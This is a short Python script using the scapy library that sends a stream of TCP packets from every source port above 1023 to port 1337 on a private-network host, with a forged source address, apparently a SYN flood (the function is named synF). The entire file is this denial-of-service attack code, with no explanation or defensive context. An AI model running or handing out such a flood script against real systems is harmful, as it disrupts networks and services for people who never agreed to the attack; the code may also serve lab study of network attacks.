from scapy.all import *

def synF(src, tgt):
    for sport in range (1024, 65535):
        L3 = IP(src= src, dst = tgt)
        L4 = TCP(sport = sport, dport=1337)
        pkt = L3/L4
        send(pkt)

src = "192.168.1.7"
tgt = "192.168.1.8"

synF(src, tgt)